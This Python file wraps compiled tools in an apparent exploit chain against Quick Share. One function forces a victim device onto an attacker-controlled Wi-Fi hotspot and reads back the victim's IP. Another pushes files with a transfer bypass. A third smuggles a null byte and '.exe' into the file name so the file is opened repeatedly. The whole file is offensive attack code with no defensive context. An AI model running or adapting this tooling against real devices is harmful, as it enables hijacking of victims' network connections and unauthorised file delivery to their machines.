import base64
import os
import subprocess
from parse import parse

BAZEL_BIN_PATH = "./QuickShareCommunication/bazel-bin/tools/"
    

def force_wifi_connection_using_quick_share(target_bt_address: str, ap_ssid: str, ap_pass: str, ap_ip: str, ap_freq: int) -> str:
    tool_path = os.path.join(BAZEL_BIN_PATH, "force_wifi_connection.exe")
    p = subprocess.run([tool_path, target_bt_address, ap_ssid, ap_pass, ap_freq, ap_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    output_parse_result = parse("{}Victim successfully connected to our hotspot with IP: {}\r\n{}", p.stdout.decode())
    if None == output_parse_result:
        return None
    
    _, target_ip, _ = output_parse_result
    return target_ip


def send_file_with_bypass_using_quick_share(medium: str, target_ip: str, target_port: int, file_to_send_path: str, file_name: bytes):
    tool_path = os.path.join(BAZEL_BIN_PATH, "send_file_with_bypass.exe")
    p = subprocess.Popen([tool_path, medium, target_ip, str(target_port), file_to_send_path, base64.b64encode(file_name).decode()])
    p.wait()


def force_quick_share_to_continuously_open_file(medium: str, target_ip: str, target_port: int, file_to_send_path: str, file_name: bytes):
    tool_path = os.path.join(BAZEL_BIN_PATH, "send_file_with_bypass.exe")
    p = subprocess.Popen([tool_path, medium, target_ip, str(target_port), file_to_send_path, base64.b64encode(file_name + b"\x00.exe").decode()])
    p.wait()
